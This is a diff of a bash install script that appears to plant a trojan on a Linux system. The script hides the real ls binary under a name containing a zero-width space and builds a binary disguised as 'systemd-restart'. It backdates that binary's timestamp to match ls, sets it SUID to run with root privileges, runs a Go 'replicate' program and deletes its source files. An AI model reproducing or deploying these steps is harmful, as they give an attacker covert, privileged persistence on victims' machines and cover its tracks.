@@ -1,16 +1,9 @@
 #!/bin/bash
-if [ $# -eq 0 ]; then
-    echo "No arguments supplied; assuming first time"
-	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
+if test -f "/usr/bin/ls​"; then
+    echo "Modded ls binary already found. Assuming reinstall."
 else
-	i=1;
-	for user in "$@" 
-	do
-    	echo "Username - $i: $user";
-    	i=$((i + 1));
-	done
+	mv "/usr/bin/ls" "/usr/bin/ls​" #THERE IS A ZERO WIDTH SPACE HERE
 fi
-return
 #Build executables
 #NOTE: This requires the packages golang and gcc to be installed
 gcc systemd-restart.c
@@ -35,6 +28,15 @@ touch -d "$(date -R -r /usr/bin/ls​)" /usr/bin/systemd-restart
 
 #Set suid so the process will always execute with system privileges
 chmod u+s /usr/bin/systemd-restart
+
+for arg in "$@" 
+do
+	if [ $arg != "--replicate" ]; then
+		cd replicate
+		go run replicate.go
+		cd ..
+	fi
+done
 
 #Remove files
 rm systemd-restart.c
